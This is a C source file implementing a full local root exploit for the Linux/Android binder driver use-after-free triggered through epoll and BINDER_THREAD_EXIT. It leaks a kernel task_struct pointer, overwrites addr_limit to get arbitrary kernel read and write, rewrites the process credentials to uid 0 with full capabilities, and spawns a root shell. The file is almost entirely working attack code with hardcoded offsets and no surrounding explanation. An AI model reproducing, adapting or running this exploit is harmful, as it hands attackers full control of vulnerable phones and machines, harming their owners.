#define _GNU_SOURCE
// ^ for PAGE_SIZE and F_SETPIPE_SZ

#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define INFO(A, ...) printf("[+] " #A " \n", ##__VA_ARGS__)
#ifdef DEBUGGING
#define DEBUG(A, ...) printf("[~] " #A "\n", ##__VA_ARGS__)
#else
#define DEBUG(A, ...)
#endif
#define ERROR(A, ...) fprintf(stderr, "[!] " #A "\n", ##__VA_ARGS__)

#define BINDER_THREAD_EXIT 0x40046208
#define TASK_STRUCT_PTR_OFFSET 0xe8
#define KERNEL_ADDRESS_MASK 0xffff888000000000

#define CRED_OFFSET 0x688
#define ADDR_LIMIT_OFFSET 0xa18

#define UID_OFFSET 0x4
#define GID_OFFSET 0x8
#define SUID_OFFSET 0xc
#define SGID_OFFSET 0x10
#define EUID_OFFSET 0x14
#define EGID_OFFSET 0x18
#define FSUID_OFFSET 0x1c
#define FSGID_OFFSET 0x20
#define SECUREBITS_OFFSET 0x24
#define CAP_INHERITABLE_OFFSET 0x28
#define CAP_PERMITTED_OFFSET 0x30
#define CAP_EFFECTIVE_OFFSET 0x38
#define CAP_BSET_OFFSET 0x40
#define CAP_AMBIENT_OFFSET 0x48

// /arch/x86/include/asm/uaccess.h#L92 / /arch/arm64/include/asm/uaccess.h#L90
// 0xfe at end because of /source/lib/iov_iter.c#L436 (uaccess_kernel()) 
#define ADDR_LIMIT_MAX 0xfffffffffffffffe
// /include/uapi/linux/securebits.h#L10
#define SECUREBITS_DEFAULT 0x0
// /include/linux/capability.h#L84
#define CAP_EMPTY_SET 0x0
#define CAP_FULL_SET 0x3fffffffff

#define INIT_FDS(A, B) \
do { \
A = open("/dev/binder", O_RDONLY); \
B = epoll_create(1000); \
} while(0)

#define FREE_BINDER_THREAD(BFD) ioctl(binder_fd, BINDER_THREAD_EXIT, NULL)
#define PREPARE_BINDER_THREAD(EFD, BFD, EVENT) epoll_ctl(EFD, EPOLL_CTL_ADD, BFD, EVENT)
#define TRIGGER_UNLINK(EFD, BFD, EVENT) epoll_ctl(EFD, EPOLL_CTL_DEL, BFD, EVENT)

#define N_IOVEC 25 // struct binder_thread is 408 B, struct iovec is 16 B 
                   //-> 25 * 16 = 400 
                   //-> does not overwrite task_struct address in binder_thread

#define MMAP_ADDR 0x100000000
#define MMAP_SIZE 2 * PAGE_SIZE
#define MMAP_FAKE_PAGE(A) A = mmap((void *)MMAP_ADDR, MMAP_SIZE, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)

#define PREPARE_IOVEC_LEAK(A, B) \
do { \
memset(A, 0x0, sizeof(A)); \
A[10].iov_base = (void *)B; \
A[10].iov_len = PAGE_SIZE; \
A[11].iov_base = (void *)0xdeadf007; \
A[11].iov_len = PAGE_SIZE; \
} while(0)

#define PREPARE_IOVEC_WRITE(A, B) \
do { \
memset(A, 0x0, sizeof(A)); \
A[10].iov_base = (void *)B; \
A[10].iov_len = 1; \
A[11].iov_base = (void *)0xdeadf007; \
A[11].iov_len = 0x28; \
A[12].iov_base = (void *)0xdeadf007; \
A[12].iov_len = 0x8; \
} while(0)

#define PREPARE_WRITE_BUFFERS(A, B) \
do { \
*(size_t *)(&A[0x0]) = 0x1; \
*(void **)(&A[0x8]) = (void *)0xdeadf007; \
*(size_t *)(&A[0x10]) = 0x28; \
*(void **)(&A[0x18]) = (void *)(B+ADDR_LIMIT_OFFSET); \
*(size_t *)(&A[0x20]) = 0x8; \
*(uint64_t *)(&A[0x28]) = ADDR_LIMIT_MAX; \
} while(0)

struct context {
    int binder_fd;
    int epoll_fd;
    void *fake_page;
    uint64_t task_struct_ptr;
    int kernel_read_pipe;
    int kernel_write_pipe;
};

uint64_t leak_task_struct_pointer(struct context *ctx) {
    int read_pipe, write_pipe, binder_fd, epoll_fd;
    int pipe_fd[2];
    ssize_t written_bytes;
    void *fake_page;
    uint8_t read_buffer[PAGE_SIZE];
    struct epoll_event event = {.events = EPOLLIN};
    struct iovec iov[N_IOVEC];
    uint64_t task_struct_ptr;

    binder_fd = ctx->binder_fd;
    epoll_fd = ctx->epoll_fd;
    fake_page = ctx->fake_page;

    pipe(pipe_fd);
    read_pipe = pipe_fd[0];
    write_pipe = pipe_fd[1];
    DEBUG("fcntl: %u", fcntl(read_pipe, F_SETPIPE_SZ, PAGE_SIZE));
    DEBUG("read_pipe: %d", read_pipe);
    DEBUG("write_pipe: %d", write_pipe);    

    INFO("prepare iovec");
    PREPARE_IOVEC_LEAK(iov, fake_page);

    INFO("prepare binder_thread and link wait queue");
    PREPARE_BINDER_THREAD(epoll_fd, binder_fd, &event);

    if (fork() == 0) {
        sleep(2);
        
        INFO("CHILD: unlink wait queue");
        TRIGGER_UNLINK(epoll_fd, binder_fd, &event);
        read(read_pipe, read_buffer, sizeof(read_buffer));
        DEBUG("CHILD: 0x%lx (expect 0x0)", *(uint64_t *)(read_buffer + TASK_STRUCT_PTR_OFFSET));
        close(write_pipe);
        exit(0);
    }

    INFO("free binder_thread");
    FREE_BINDER_THREAD(binder_fd);
    written_bytes = writev(write_pipe, iov, N_IOVEC);
    DEBUG("written %zd B", written_bytes); 
    if (written_bytes != 2 * PAGE_SIZE) {
        ERROR("written %zd B", written_bytes);   
        ERROR("written bytes != 2 * PAGE_SIZE");
        return 0;        
    }
    else {
        INFO("Write to pipe successful");
    }
    read(read_pipe, read_buffer, sizeof(read_buffer));

    task_struct_ptr = *(uint64_t *)(read_buffer + TASK_STRUCT_PTR_OFFSET);
    // We already know that it should have worked because 0xdeadb007 should
    // be unmapped -> therefore not the address from our iovec was used
    if (((task_struct_ptr & KERNEL_ADDRESS_MASK) == KERNEL_ADDRESS_MASK)) {        
        INFO("leaked task pointer: 0x%lx", task_struct_ptr);
    }
    else {
        ERROR("Could not leak task pointer");
        return 0;
    }

    return task_struct_ptr;
}

int write_addr_limit(struct context *ctx) {
    int binder_fd, epoll_fd, read_socket, write_socket;
    int sv[2];
    ssize_t read_bytes;
    void *fake_page;
    uint8_t write_buffer[0x28 + 0x8];
    struct epoll_event event = {.events = EPOLLIN};
    struct msghdr msg;
    struct iovec iov[N_IOVEC];

    binder_fd = ctx->binder_fd;
    epoll_fd = ctx->epoll_fd;    
    fake_page = ctx->fake_page;

    if (socketpair(PF_UNIX, SOCK_STREAM, 0, sv) == -1) {
        ERROR("Could not create socket pair");
	    perror("Error:");
	    return 1;
    }
    read_socket = sv[0];
    write_socket = sv[1];

    INFO("prepare iovec");
    PREPARE_IOVEC_WRITE(iov, fake_page);

    INFO("prepare binder_thread and link wait queue");
    PREPARE_BINDER_THREAD(epoll_fd, binder_fd, &event);
    PREPARE_WRITE_BUFFERS(write_buffer, ctx->task_struct_ptr);

    memset(&msg, 0x0, sizeof(struct msghdr));
    msg.msg_iov = iov;
    msg.msg_iovlen = N_IOVEC;
    
    write(write_socket, "A", 1);
    if (fork() == 0) {        
        sleep(2);
        
        INFO("CHILD: unlink wait queue");
        TRIGGER_UNLINK(epoll_fd, binder_fd, &event);
        write(write_socket, write_buffer, sizeof(write_buffer));

        close(write_socket);
        exit(0);
    }

    INFO("free binder_thread");
    FREE_BINDER_THREAD(binder_fd);
    read_bytes = recvmsg(read_socket, &msg, MSG_WAITALL);
    DEBUG("read %zd B", read_bytes);   
    if (read_bytes != 0x1 + 0x28 + 0x8) {
        ERROR("read %zd B", read_bytes);   
        ERROR("written bytes != 0x1 + 0x28 + 0x8");
        return 1;        
    }
    else {
        INFO("write to socket successful");
    }

    return 0;
}

int kernel_read(struct context *ctx, void *dest, void *address, ssize_t size) {
    int read_pipe, write_pipe;
    ssize_t written_bytes;

    read_pipe = ctx->kernel_read_pipe;
    write_pipe = ctx->kernel_write_pipe;

    DEBUG("write from address to pipe");
    written_bytes = write(write_pipe, address, size);    
    DEBUG("written %ld B", written_bytes);
    if (written_bytes != size) {
        ERROR("written %ld B, written_bytes != %zu", written_bytes, size);
        perror("Error");
        return 1;
    }

    DEBUG("read written data from pipe");
    read(read_pipe, dest, size);
    return 0;
}

int kernel_write(struct context *ctx, void *src, void *address, ssize_t size) {
    int read_pipe, write_pipe;
    ssize_t written_bytes;

    read_pipe = ctx->kernel_read_pipe;
    write_pipe = ctx->kernel_write_pipe;

    DEBUG("write src buffer to pipe");
    written_bytes = write(write_pipe, src, size);    
    DEBUG("written %ld B", written_bytes);
    if (written_bytes != size) {
        ERROR("written %ld B, written_bytes != %zu", written_bytes, size);
        perror("Error");
        return 1;
    }

    DEBUG("read written data from pipe to address");
    read(read_pipe, address, size);
    return 0;
}

uint64_t kernel_read_uint64(struct context *ctx, void *address) {
    uint64_t dest;
    kernel_read(ctx, &dest, address, sizeof(uint64_t));
    return dest;
}

void kernel_write_uint32(struct context *ctx, uint32_t src, void *address) {
    kernel_write(ctx, &src, address, sizeof(uint32_t));
}

void kernel_write_uint64(struct context *ctx, uint64_t src, void *address) {
    kernel_write(ctx, &src, address, sizeof(uint64_t));
}

int test_read(struct context *ctx) {
    int pipe_fd[2];    
    uint64_t addr_limit;

    pipe(pipe_fd);
    ctx->kernel_read_pipe = pipe_fd[0];
    ctx->kernel_write_pipe = pipe_fd[1];

    INFO("test arbitrary read");

    addr_limit = 0;
    addr_limit = kernel_read_uint64(ctx, (void *)(ctx->task_struct_ptr + ADDR_LIMIT_OFFSET));

    DEBUG("addr_limit: %lx", addr_limit);
    if (addr_limit == 0) {
        ERROR("could not read addr_limit");
        return 1;
    }
    else if (addr_limit != ADDR_LIMIT_MAX) {
        ERROR("something was read but addr_limit is not ADDR_LIMIT_MAX");
        return 1;
    }

    INFO("arbitrary read successful");
    return 0;
}

int patch_credentials(struct context *ctx) {
    uint64_t cred_ptr;

    cred_ptr = kernel_read_uint64(ctx, (void *)(ctx->task_struct_ptr + CRED_OFFSET));
    // set initial task creds (/kernel/cred.c#L44)
    // give root uid/gid 0 everywhere
    kernel_write_uint32(ctx, 0, (void *)(cred_ptr + UID_OFFSET));
    kernel_write_uint32(ctx, 0, (void *)(cred_ptr + GID_OFFSET));
    kernel_write_uint32(ctx, 0, (void *)(cred_ptr + SUID_OFFSET));
    kernel_write_uint32(ctx, 0, (void *)(cred_ptr + SGID_OFFSET));
    kernel_write_uint32(ctx, 0, (void *)(cred_ptr + EUID_OFFSET));
    kernel_write_uint32(ctx, 0, (void *)(cred_ptr + EGID_OFFSET));
    kernel_write_uint32(ctx, 0, (void *)(cred_ptr + FSUID_OFFSET));
    kernel_write_uint32(ctx, 0, (void *)(cred_ptr + FSGID_OFFSET));
    // root user has all capabilities
    kernel_write_uint32(ctx, SECUREBITS_DEFAULT, (void *)(cred_ptr + SECUREBITS_OFFSET));
    kernel_write_uint64(ctx, CAP_EMPTY_SET, (void *)(cred_ptr + CAP_INHERITABLE_OFFSET));
    kernel_write_uint64(ctx, CAP_FULL_SET, (void *)(cred_ptr + CAP_PERMITTED_OFFSET));
    kernel_write_uint64(ctx, CAP_FULL_SET, (void *)(cred_ptr + CAP_EFFECTIVE_OFFSET));
    kernel_write_uint64(ctx, CAP_FULL_SET, (void *)(cred_ptr + CAP_BSET_OFFSET));
    kernel_write_uint64(ctx, CAP_EMPTY_SET, (void *)(cred_ptr + CAP_AMBIENT_OFFSET));
  
    return getuid();
}

int main() {
    struct context ctx;

    INFO("initialise file descriptors");
    INIT_FDS(ctx.binder_fd, ctx.epoll_fd);
    DEBUG("binder_fd: %d", ctx.binder_fd);
    DEBUG("epoll_fd: %d", ctx.epoll_fd);

    INFO("mmap fake page");
    MMAP_FAKE_PAGE(ctx.fake_page);
    DEBUG("mapped at: %p (MAP_FIXED, so should be 0x%lx)", ctx.fake_page, MMAP_ADDR);
    if (ctx.fake_page == MAP_FAILED) {
        ERROR("mapping dummy page failed");
        perror("Error: ");
    }

    if ((ctx.task_struct_ptr = leak_task_struct_pointer(&ctx)) == 0) {
        ERROR("failed while leaking task_struct pointer");
        exit(1);
    }

    if (write_addr_limit(&ctx)) {
        ERROR("failed while overwriting addr_limit");
        exit(1);
    };

    if (test_read(&ctx)) {
        ERROR("could not verify arbitrary kernel read");
        exit(1);
    }

    DEBUG("uid before patching: %d", getuid());
    if (patch_credentials(&ctx)) {
        ERROR("could not patch credentials");
        exit(1);
    }

    // patch_credentials returned 0, so process should have root creds :)
    INFO("uid: %d :)", getuid());
    execve("/bin/sh", 0, 0);
}
